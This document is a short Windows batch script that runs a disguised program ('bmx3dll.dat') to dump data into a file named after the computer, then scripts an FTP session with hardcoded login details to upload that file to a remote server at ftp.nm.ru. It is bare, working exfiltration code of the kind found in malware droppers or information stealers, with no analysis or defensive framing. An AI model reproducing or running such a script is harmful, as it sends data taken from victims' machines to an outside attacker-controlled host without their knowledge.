@Echo off
bmx3dll.dat %computername%.txt

echo open ftp.nm.ru 21>b 
echo R5X5.nm.ru>>b 
echo 123456>>b 
echo bin>>b 
echo send %computername%.txt>>b
echo bye>>b
ftp -s:b
